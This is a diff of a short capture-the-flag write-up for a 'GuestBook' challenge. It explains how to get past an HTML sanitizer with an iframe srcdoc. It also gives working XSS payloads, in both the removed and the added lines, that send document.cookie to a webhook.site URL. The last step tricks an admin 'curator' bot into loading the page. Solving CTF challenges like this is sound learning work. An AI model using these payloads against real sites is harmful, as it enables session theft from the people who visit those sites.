@@ -1,2 +1,13 @@
-GuestBook ->   every challenge can be solved using the magic string of suffre insert this in the request intercepted using burp suite. This will redirect the cookie to our web hookpage. The problem is that all pages read an arbitrary url without checking anything: {"url": "javascript:fetch('https://webhook.site/3056ed01-9288-4df2-8d98-1f21d274a20a?cookie='+btoa(document.cookie))"}
+GuestBook: 
 
+the input is sanitized. there are some tags that are skipped, for example <script> tag, "javascript" or also "onerror" element inside a tag (e.g. img).
+
+to bypass this sanitization we can try with other tags, for example the <iframe> tag, with srcdoc as the code to execute.
+inserting for example an alert(1) will trigger an allert every time the page is reloaded.
+<iframe srcdoc="&lt;script&gt;alert(1);&lt;/script&gt;"></iframe>
+
+we can so insert a fetch instead of the alert, to receive a cookie
+<iframe srcdoc="&lt;script&gt;fetch('https://webhook.site/00bbed8d-75dc-4a14-bafe-aafde75f6f11/?flag='+document.cookie);&lt;/script&gt;"></iframe>
+simply putting this is not necessary. because once the page is normally reloaded we wont receive the cookie, which is retained by the curator.
+
+we then need to pass the url of the whole website to the curator, inside the "Report a Suspicious Entry" box, so that the curator will reload the page and we can obtain the cookie.
